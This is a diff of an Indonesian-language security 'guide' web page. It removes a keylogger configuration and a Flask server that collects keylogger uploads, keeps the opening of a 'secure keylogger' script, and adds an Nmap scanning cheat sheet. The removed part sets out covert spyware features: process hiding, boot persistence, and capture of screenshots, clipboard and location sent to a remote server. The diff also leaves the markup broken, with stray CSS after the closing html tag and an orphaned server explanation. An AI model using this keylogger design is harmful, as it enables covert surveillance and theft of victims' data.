@@ -246,132 +246,10 @@
         </div>
 
         <div class="privacy-section animate-on-scroll">
-            <button class="collapsible">Keylogger Configuration Guide</button>
+            <button class="collapsible">Contoh Script Keylogger</button>
             <div class="content">
                 <div class="content-inner">
-                    <p>Below is the standard configuration structure for the keylogger implementation. This configuration should be stored in a <code>config.json</code> file:</p>
-                    <pre><code>{
-                        "log_file": "encrypted_log.bin",
-                        "server_url": "https://your-secure-server.com/log",
-                        "send_interval": 300,
-                        "max_log_size": 51200,
-                        "encryption_key": null,
-                        "hide_process": true,
-                        "persistence": true,
-                        "idle_threshold": 600,
-                        "screenshot": {
-                            "enabled": true,
-                            "interval": 600,
-                            "max_files": 50,
-                            "quality": 60,
-                            "upload_immediately": true
-                        },
-                        "clipboard": {
-                            "enabled": true,
-                            "interval": 300,
-                            "max_size": 10240,
-                            "filter_sensitive": true
-                        },
-                        "geolocation": {
-                            "enabled": true,
-                            "interval": 1800,
-                            "accuracy": "medium",
-                            "cache_timeout": 3600
-                        },
-                        "security": {
-                            "use_https": true,
-                            "verify_ssl": true,
-                            "max_retries": 3,
-                            "timeout": 30,
-                            "secure_delete": true
-                        },
-                        "logging": {
-                            "level": "ERROR",
-                            "max_size": 1048576,
-                            "backup_count": 3,
-                            "log_rotation": true
-                        }
-                    }</code></pre>
-                    <h4>Penjelasan Konfigurasi:</h4>
-                    <ul>
-                        <li><strong>log_file</strong>: Lokasi penyimpanan file log terenkripsi</li>
-                        <li><strong>server_url</strong>: URL server untuk mengirim data log terenkripsi</li>
-                        <li><strong>send_interval</strong>: Interval waktu pengiriman log dalam detik</li>
-                        <li><strong>max_log_size</strong>: Ukuran maksimum file log dalam bytes</li>
-                        <li><strong>encryption_key</strong>: Kunci enkripsi untuk mengamankan data</li>
-                        <li><strong>hide_process</strong>: Opsi untuk menyembunyikan proses dari task manager</li>
-                        <li><strong>persistence</strong>: Opsi untuk menjalankan otomatis saat sistem boot</li>
-                        <li><strong>idle_threshold</strong>: Batas waktu idle dalam detik</li>
-                    </ul>
-
-                    <h4>Pengaturan Screenshot:</h4>
-                    <ul>
-                        <li><strong>enabled</strong>: Mengaktifkan/menonaktifkan fitur screenshot</li>
-                        <li><strong>interval</strong>: Interval pengambilan screenshot dalam detik</li>
-                        <li><strong>max_files</strong>: Jumlah maksimum file screenshot yang disimpan</li>
-                        <li><strong>quality</strong>: Kualitas gambar screenshot (1-100)</li>
-                        <li><strong>upload_immediately</strong>: Upload screenshot segera setelah diambil</li>
-                    </ul>
-
-                    <h4>Pengaturan Clipboard:</h4>
-                    <ul>
-                        <li><strong>enabled</strong>: Mengaktifkan/menonaktifkan monitoring clipboard</li>
-                        <li><strong>interval</strong>: Interval pemeriksaan clipboard dalam detik</li>
-                        <li><strong>max_size</strong>: Ukuran maksimum data clipboard yang disimpan</li>
-                        <li><strong>filter_sensitive</strong>: Filter informasi sensitif dari clipboard</li>
-                    </ul>
-
-                    <h4>Pengaturan Geolokasi:</h4>
-                    <ul>
-                        <li><strong>enabled</strong>: Mengaktifkan/menonaktifkan pelacakan lokasi</li>
-                        <li><strong>interval</strong>: Interval pembaruan lokasi dalam detik</li>
-                        <li><strong>accuracy</strong>: Tingkat akurasi lokasi (low/medium/high)</li>
-                        <li><strong>cache_timeout</strong>: Waktu penyimpanan cache lokasi dalam detik</li>
-                    </ul>
-
-                    <h4>Pengaturan Keamanan:</h4>
-                    <ul>
-                        <li><strong>use_https</strong>: Menggunakan protokol HTTPS untuk pengiriman data</li>
-                        <li><strong>verify_ssl</strong>: Verifikasi sertifikat SSL server</li>
-                        <li><strong>max_retries</strong>: Jumlah percobaan ulang saat gagal mengirim</li>
-                        <li><strong>timeout</strong>: Batas waktu koneksi dalam detik</li>
-                        <li><strong>secure_delete</strong>: Menghapus file secara aman</li>
-                    </ul>
-
-                    <h4>Pengaturan Logging:</h4>
-                    <ul>
-                        <li><strong>level</strong>: Level detail log (DEBUG/INFO/WARNING/ERROR)</li>
-                        <li><strong>max_size</strong>: Ukuran maksimum file log dalam bytes</li>
-                        <li><strong>backup_count</strong>: Jumlah backup file log yang disimpan</li>
-                        <li><strong>log_rotation</strong>: Rotasi file log otomatis</li>
-                    </ul>
-                    <div class="warning-box">
-                        <h4>Pertimbangan Keamanan Penting:</h4>
-                        <ul>
-                            <li>Kunci enkripsi harus disimpan dengan aman dan tidak boleh terekspos dalam kode</li>
-                            <li>Endpoint server harus menggunakan HTTPS untuk transmisi yang aman</li>
-                            <li>Terapkan kontrol akses yang tepat pada server penerima</li>
-                            <li>Audit keamanan rutin direkomendasikan</li>
-                        </ul>
-                    </div>
-                    <div class="info-box">
-                        <h4>Pedoman Hukum dan Etika:</h4>
-                        <ul>
-                            <li>Gunakan hanya dalam lingkungan pengujian yang terkontrol</li>
-                            <li>Dapatkan otorisasi yang tepat sebelum penerapan</li>
-                            <li>Patuhi hukum pemantauan komputer lokal</li>
-                            <li>Jaga standar privasi pengguna dan perlindungan data</li>
-                        </ul>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="privacy-section animate-on-scroll">
-            <button class="collapsible">Keylogger Script Example</button>
-            <div class="content">
-                <div class="content-inner">
-                    <p>Here's an example of a secure keylogger implementation with encryption:</p>
+                    <p>Berikut adalah contoh implementasi keylogger yang aman dengan enkripsi:</p>
                     <pre><code># Advanced Keylogger with Encryption and Security Features
                         import pynput.keyboard
                         import threading
@@ -554,52 +432,114 @@
         </div>
 
         <div class="privacy-section animate-on-scroll">
-            <button class="collapsible">Server Implementation Guide</button>
+            <button class="collapsible">Enumerasi Jaringan dengan Nmap</button>
             <div class="content">
                 <div class="content-inner">
-                    <h4>1. Instalasi Flask</h4>
-                    <p>Pastikan Anda telah menginstal Flask:</p>
-                    <pre><code>pip install Flask</code></pre>
+                    <h4>Panduan Singkat Nmap untuk Enumerasi Jaringan</h4>
+                    <p>Panduan lengkap untuk pemindaian dan enumerasi jaringan menggunakan Nmap, mencakup teknik dan opsi pemindaian umum:</p>
 
-                    <h4>2. Kode Server (server.py)</h4>
-                    <pre><code># Advanced Server Implementation with Flask
-from flask import Flask, request
-import os
-import base64
-import time
+                    <div class="content">
+                        <div class="content-inner">
+                            <h5>Pemindaian Dasar</h5>
+                            <pre><code># Pemindaian target dasar
+nmap &lt;target&gt;
 
-app = Flask(__name__)
+# Pemindaian SYN (pemindaian port yang cepat dan tersembunyi)
+nmap -sS &lt;target&gt;
 
-UPLOAD_FOLDER = 'uploads'  # Direktori tempat menyimpan file log
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+# Pemindaian koneksi TCP (lebih dapat diandalkan tapi lebih lambat)
+nmap -sT &lt;target&gt;
 
-@app.route('/log', methods=['POST'])
-def receive_log():
-    try:
-        log_data_base64 = request.form['log']
-        log_data = base64.b64decode(log_data_base64)
-        timestamp = time.strftime("%Y%m%d-%H%M%S")
-        filename = f"log_{timestamp}.bin"
-        filepath = os.path.join(UPLOAD_FOLDER, filename)
-        with open(filepath, 'wb') as f:
-            f.write(log_data)
-        return 'Log diterima dan disimpan', 200
-    except Exception as e:
-        print(f"Error: {e}")
-        return 'Terjadi kesalahan', 500
+# Pemindaian UDP (untuk layanan seperti DNS, NTP)
+nmap -sU &lt;target&gt;</code></pre>
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000) # Ganti port sesuai kebutuhan</code></pre>
+                            <h5>Deteksi Layanan</h5>
+                            <pre><code># Deteksi versi layanan
+nmap -sV &lt;target&gt;
+
+# Pemindaian script default
+nmap -sC &lt;target&gt;</code></pre>
+
+                            <h5>Deteksi Sistem Operasi</h5>
+                            <pre><code># Pendeteksian OS
+nmap -O &lt;target&gt;</code></pre>
+
+                            <h5>Opsi Lanjutan</h5>
+                            <pre><code># Tentukan rentang port
+nmap -p 80,443 &lt;target&gt;
+nmap -p 1-1000 &lt;target&gt;
+
+# Pemindaian agresif (menggabungkan -sS -sV -O -traceroute)
+nmap -A &lt;target&gt;
+
+# Template waktu (T1-T5)
+nmap -T4 &lt;target&gt;
+
+# Simpan hasil
+nmap -oN output.txt &lt;target&gt;
+nmap -oX output.xml &lt;target&gt;</code></pre>
+
+                            <h5>Contoh Penggunaan Script</h5>
+                            <pre><code># Jalankan script tertentu
+nmap --script &lt;nama-script&gt; &lt;target&gt;
+
+# Pemindaian script default
+nmap -sC &lt;target&gt;
+
+# Berikan argumen ke script
+nmap --script-args &lt;argumen&gt; &lt;target&gt;</code></pre>
+
+                            <h5>Contoh Praktis</h5>
+                            <pre><code># Pindai port tertentu dengan deteksi layanan
+nmap -p 80,443 -sV 192.168.1.100
+
+# Pemindaian lengkap dengan deteksi OS dan layanan
+nmap -sS -sV -O 10.0.0.1
+
+# Pemindaian agresif dengan script default
+nmap -A 172.16.0.1
+
+# Pemindaian rentang jaringan dengan output XML
+nmap -sV -oX scan.xml 192.168.1.0/24</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ Important Security Considerations:</h4>
+                        <ul>
+                            <li>Always obtain proper authorization before scanning any network</li>
+                            <li>Unauthorized scanning may be illegal and could result in legal consequences</li>
+                            <li>Be mindful of network bandwidth and system resources</li>
+                            <li>Avoid scanning critical infrastructure without explicit permission</li>
+                        </ul>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>ℹ️ Best Practices:</h4>
+                        <ul>
+                            <li>Document all scanning activities and findings</li>
+                            <li>Use appropriate timing templates to avoid network disruption</li>
+                            <li>Keep Nmap and its scripts updated to the latest version</li>
+                            <li>Follow the organization's security policies and guidelines</li>
+                            <li>Refer to the official Nmap documentation for detailed information: <a href="https://nmap.org/book/man.html" target="_blank">Nmap Documentation</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
 
                     <h4>Penjelasan Komponen:</h4>
-                    <ul>
-                        <li><strong>Flask(__name__)</strong>: Membuat instance aplikasi Flask</li>
-                        <li><strong>UPLOAD_FOLDER</strong>: Menentukan direktori penyimpanan file log</li>
-                        <li><strong>/log</strong>: Route untuk menangani permintaan POST dari keylogger</li>
-                        <li><strong>base64.b64decode()</strong>: Mendekode data log yang di-base64</li>
-                        <li><strong>time.strftime()</strong>: Membuat timestamp untuk nama file</li>
-                    </ul>
+                    <div class="content">
+                        <div class="content-inner">
+                            <ul>
+                                <li><strong>Flask(__name__)</strong>: Membuat instance aplikasi Flask</li>
+                                <li><strong>UPLOAD_FOLDER</strong>: Menentukan direktori penyimpanan file log</li>
+                                <li><strong>/log</strong>: Route untuk menangani permintaan POST dari keylogger</li>
+                                <li><strong>base64.b64decode()</strong>: Mendekode data log yang di-base64</li>
+                                <li><strong>time.strftime()</strong>: Membuat timestamp untuk nama file</li>
+                            </ul>
+                        </div>
+                    </div>
 
                     <h4>3. Menjalankan Server</h4>
                     <ol>
@@ -714,5 +654,74 @@ def secure_hash_password(password):
     </script>
     <script src="script.js"></script>
     <script src="scroll-animations.js"></script>
+</body>
+</html>
+        @media (max-width: 768px) {
+            .privacy-hero {
+                padding: 4rem 1rem;
+            }
+            .privacy-hero h1 {
+                font-size: 2rem;
+            }
+            .privacy-section {
+                padding: 1.5rem;
+            }
+            .collapsible {
+                font-size: 1rem;
+            }
+            .content-inner {
+                padding: 0.75rem;
+            }
+            pre {
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .privacy-hero {
+                padding: 3rem 1rem;
+            }
+            .privacy-hero h1 {
+                font-size: 1.75rem;
+            }
+            .privacy-section {
+                padding: 1rem;
+            }
+            .content-inner {
+                padding: 0.5rem;
+            }
+        }
+
+        .warning-box, .info-box {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            border-left: 4px solid;
+        }
+
+        .warning-box {
+            border-color: #e74c3c;
+        }
+
+        .info-box {
+            border-color: #3498db;
+        }
+
+        .privacy-section ul, .privacy-section ol {
+            padding-left: 1.5rem;
+            margin: 1rem 0;
+        }
+
+        .privacy-section li {
+            margin-bottom: 0.5rem;
+            line-height: 1.6;
+        }
+
+        .privacy-section h4, .privacy-section h5 {
+            margin: 1.5rem 0 1rem;
+            color: #2c3e50;
+        }
+    </style>
 </body>
 </html>
